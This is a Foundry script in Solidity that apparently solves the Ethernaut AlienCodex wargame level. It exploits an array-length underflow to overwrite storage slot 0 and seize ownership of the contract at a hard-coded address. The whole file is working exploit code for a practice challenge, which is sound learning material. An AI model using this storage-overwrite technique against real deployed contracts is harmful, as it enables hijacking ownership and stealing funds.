// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {AlienCodex} from "../src/AlienCodex.sol";
import {Script} from "forge-std/Script.sol";

contract AlienCodexAttack is Script {
    AlienCodex public alienCodex =
        AlienCodex(0xF1c723AED1DfCB66feEFf6B5e4908F996DE483eb);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 attackerAddress = bytes32(
            uint256(uint160(vm.envAddress("MY_ADDRESS")))
        );

        alienCodex.makeContact();
        alienCodex.retract();

        uint targetAddress = ((2 ** 256 - 1) - uint(keccak256(abi.encode(1)))) + 1;

        alienCodex.revise(targetAddress, bytes32(attackerAddress));

        vm.stopBroadcast();
    }
}
